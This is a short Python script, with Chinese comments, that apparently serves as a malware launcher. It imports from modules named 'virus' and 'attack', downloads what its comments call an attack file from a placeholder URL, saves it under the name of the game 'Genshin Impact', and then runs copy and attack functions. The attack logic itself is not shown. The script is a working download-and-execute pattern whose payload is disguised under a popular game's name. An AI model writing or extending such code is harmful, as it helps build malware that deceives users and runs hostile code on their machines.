from virus import *
from pathlib import Path
from attack import *

if __name__ == "__main__":
    # 下载文件
    url = "https://127.0.0.1" # 下载攻击文件的链接
    save_directory = Path('.') # 无需配置
    save_path = save_directory / "Genshin Impact.py" # 无需配置

    if download_file(url, save_path):
        copy_genshin_to_attack()
        attack()
    else:
        print("下载失败")

    input("按回车键退出...")